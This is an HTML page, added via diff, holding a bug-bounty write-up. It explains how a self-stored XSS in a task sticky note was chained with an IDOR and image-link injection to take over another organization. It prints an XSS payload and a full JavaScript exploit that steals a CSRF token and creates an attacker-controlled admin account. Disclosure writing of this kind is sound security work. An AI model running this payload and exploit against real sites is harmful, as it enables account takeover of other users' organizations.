@@ -1,0 +1,185 @@
+<!DOCTYPE HTML>
+<html>
+        <head>
+                <title>Escalting Self-XSS To Stored XSS via Image Injection + IDOR</title>
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <link rel="stylesheet" type="text/css" href="assets/css/main.css">
+
+	<link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/styles/default.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+
+<style>
+	p
+	{
+		line-height:2.0em;
+	}
+
+</style>
+
+
+        </head>
+
+	<body  style="font-family:'Courier New'">
+		<img src="assets/images/image-injection/self-xss.png" class="responsive" alt="some-image here">
+
+	<main class="container">
+
+		<h3 style="text-align: center;">Escalating Self-XSS To Stored XSS via Image injection + IDOR</h3>	
+
+		<p> Hello everyone, I hope you guys are doing good. In this article i am going to share how i found a self-stored xss and how i escalated it to
+		organization takeover by chaining it with image injection and IDOR. We all know about XSS and IDOR but what is Image Injection? Few days ago i
+		saw <a href="https://twitter.com/Regala_/status/1413868044057780224" target="_blank">this</a>
+		tweet where <b>Fisher</b> asked about Image Injection Vulnerability and people are telling in replies that loading images in texts intended field or
+		loading images using &lt;img&gt; tag is known as Image injection vulnerability. I also replied to that tweet as i found this chain of bugs few
+		days before that tweet. Last night a friend of mine texted me link of that tweet and asked me to explain that to him. So that's when i realized this
+		chain of bugs deserved a write-up. So lets get to the main story now.</p>
+		<br><br><p>
+		First let me put some light on Image Injection Vulnerability. I did some google and found out vulnerabilities that occurs via images metadata are 
+		known as Image injection vulnerabilities. For example putting XSS payload inside a valid image or putting php payloads. But what i mean by Image
+		Injection in this article is that i can load an external image using &lt;img&gt; tag like this:</p>
+		<pre>
+		<code class="hljs java">
+		&lt;img src="https://r29k.com/external-image.jpg"&gt;</code>
+		</pre>
+		<br><p>
+		But that look like a html injection? Yes it does look like html injection but i wasn't allowed to use html, only few tags like &ltimg&gt; , 
+		&lt;a&gt; and &lt;br&gt; tags are allowed for some reasons.</p>
+		<br><br>
+		<p>
+		The program i was hacking on was an Employees Management system where you can manage employees of your own organization, create tasks , groups for
+		them. Employees can follow each other, they can even follow employees of other organizations too. Followers can send messages each other and will be 
+		able to see posts of each other , they can comment and like those posts just like Facebook.
+		</p><br><p>
+		Admins and Managers can create tasks and then assign them to different employees. You can create custom tasks from scratch but there was some
+		pre-built templates for creating tasks which already have some good UI/theme and some basic info about the task you're creating. For example, 
+		you can choose a pre-built template task which will already have some keys points about the task, already have some widgets added to it.
+		You can also add a small sticky note inside the task. When i came across these templates i didn't notice this sticky note option because it was
+		hidden inside a drop down menu of <i>More options</i>. There was two fields of sticky note which were "title and description". The title field was
+		vulnerable to stored xss. I simply added this xss payload <code>&quot;&gt;&lt;svg/onload=alert(1)&gt;</code> in the title field of sticky note and
+		added it inside my task. Upon saving and opening the created task the xss was firing. But the problem was that it was self-stored xss or xss
+		from Admin to Employees which would be low or informational.</p> 
+		<br><br><p>
+		We got a self-stored xss and the next step is escalating it to a stored xss. I tried adding employees from other organization via IDOR but it didn't
+		work. I cannot share my created tasks outside of my organization, i tried accessing tasks of first organization from my second organization directly
+		via url but i got 403. I also tried CSRF but couldn't successed. So i was stuck here, i tried everything i could but couldn't find a way out. I left
+		that xss there and move onto testing next templates as we have different options inside different templates. I created few more tasks from 
+		different templates and assign them to my employees. I couldn't find anything else there other than self-stored xss. I signed into my employees
+		account and there i saw assigned tasks which i created and assigned to that employee. The employee can mark that task completed and then that task
+		will move to completed state. I marked that task and few more task completed and move onto testing other features from employee account. </p>
+		<br><br><p>
+		After sometime i logged back into admin account and went to task page, there i saw an option which wasn't available before. I saw an option of 
+		"List all completed task" which means i can list all the completed tasks from all the employees and check their progress and comments etc. When 
+		i clicked on that option a new page opened and the URL was new to me. There was a 6 digits ID in the URL, i quickly opened that URL from my 
+		second account which belongs to different organization and i was able to see the completed tasks of my first account. I changed the ID from the URL
+		and i was able to see the completed task of other users (it was a pentesting environment so there was no data of real users).
+		</p>	<br><p>
+		Here we can also see the task which have sticky note with xss payload (remember that? :p). Now we can add a sticky note with xss payload inside 
+		a task and assign it to an employee. We can mark that task completed from that employee account then that task will be available in completed
+		tasks lists. Then we can send the URL of completed task list to our victim which would be an admin of another organization, he will be able
+		to see our completed task list and in that list there will be only one completed task. That task have a sticky note with xss payload inside it. So
+		when our victim will open that task the xss will fire on its side. Finally we are able to escalate self-stored xss to stored xss but there is one
+		problem left which is that this xss is working like reflected xss. We have to send a URL of our completed task list to our victim like we do in
+		reflected xss. I was actually going for bugcrowd MVP so i need a p2 for that. </p>
+		<br><br><p>
+		As i have mentioned that users can upload post on their profile and that will be available to their followers. Users from different organizations 
+		can follow each other and can see each other posts. I tested post features for xss but couldn't find it but i came to know that the website
+		is allowing <code>&lt;img&gt; , &lt;a&gt; </code> and few other html tags like line breaks, bold, italic etc.<br>
+		This is where the Image injection vulnerability comes in. I can put URL of my completed task list behind an image and post it on my profile. My
+		followers will be able to see that image and when they will click on it they will be taken to my completed task list where they will see my
+		completed task, an upon opening any task the xss will fire because there will be sticky note with xss payload inside every task:</p>
+		<br><br>
+	 	
+ 		<img src="assets/images/image-injection/test.gif" alt="some-gif" class="responsive">
+		<br><br>
+		<p>This is how we will add completed task list URL behind an image:a</p>
+		<pre>
+		<code>
+	&lt;a href="https://target.com/tasks?tab=completed&taskID=123456"&gt;&lt;img src="https://r29k.com/123/images.jpeg"&gt;&lt;/a&gt;
+		</code>
+		</pre>
+		
+		<p>And this is how it will looks</p>
+		<br><br>
+		<img src="assets/images/image-injection/clickme.png" alt="image" class="responsive">
+		<br><br>
+		<p>Everything looks perfect but now we need an exploit for adding our account with admin privileges into victim organization. This is where
+		<a href="https://twitter.com/NeolexSecurity" target="_blank">Neloex</a> come into this story. He is a good friends who alaways helps me in
+		exploitation. So he wrote an exploit which we need to host on our server:</p>
+		<pre>
+		<code>
+			
+function getCsrf() {
+    xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://target.com/admin/user/new', true);
+    xhr.responseType = 'document';
+    xhr.onload = function () {
+        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+          var doc = xhr.responseXML;
+          csrf = doc.querySelector('meta[name="csrf-token"]').content
+          addAdmin(csrf);
+        }
+      };
+    xhr.send();
+}
+
+function addAdmin(csrfToken){
+    
+ fetch('https://target.com:443/admin/user',{
+    method: 'POST',
+    headers: {
+        'Content-Length': '329', 
+        'Cache-Control': 'max-age=0', 
+        'Sec-Ch-Ua': '" Not A;Brand";v="99", "Chromium";v="92"', 
+        'Sec-Ch-Ua-Mobile': '?0', 
+        'Upgrade-Insecure-Requests': '1', 
+        'Origin': 'https://target.com', 
+        'Content-Type': 'application/x-www-form-urlencoded', 
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4483.0 Safari/537.36 autochrome/blue', 
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
+        'Sec-Fetch-Site': 'same-origin', 
+        'Sec-Fetch-Mode': 'navigate', 
+        'Sec-Fetch-User': '?1', 
+        'Sec-Fetch-Dest': 'document', 
+        'Referer': 'https://target.com/admin/user', 
+        'Accept-Encoding': 'gzip, deflate', 
+        'Accept-Language': 'en-US,en;q=0.9', 
+        'Connection': 'close'
+    },
+    credentials: 'include',
+    body:'authenticity_token='+encodeURIComponent(csrfToken)+'first_name=R29k&last_name=hacker&email=r29k_hacker@test.com&password=qwerty111&confirm_password=qwerty111&roles=admin&save='
+});
+ }
+
+
+getCsrf();
+
+		</code>
+		</pre>
+
+		<p>
+		This exploit will steal CSRF tokens of the victim then use those tokens to make a request from victim browser for adding new account as an admin.
+		We will receieve an account activation link on our email address and we can use that to login into victim orgainzation as an admin.
+		</p>
+		<p>
+		Now comes the part which i hate most but also spend alot of time on it which is writing a good report. So tried to write a good report with 
+		gif and pictures. And the triagger triaged this report as p3, my all hard work went in vain. He disagreed with me on the severity so i asked him
+		to confirm it from the program owner which he did by creating a blocker for the program owner. Program owner asked to add my account to his
+		organization with admin privileges. So i simply asked him to open my profile and click on the image i have shared and
+		after that open any task from the list. When i woke up in the morning
+		i saw an email with 500$ bounty and the severity upgraded to p2 and a nice comment from the program owner.</p>
+		<p>
+		That's it, thank you for reading it. If you have any confusion you can reach me on my <a href="https://twitter.com/R29k_" target="_blank">Twitter</a>
+		See you in the next article.</p>
+		<br><br>
+	</main>
+	<footer>
+                <button onclick="document.location='../../index.html'">Home</button>
+
+        </footer>
+
+	</body>
+
+</html>
+
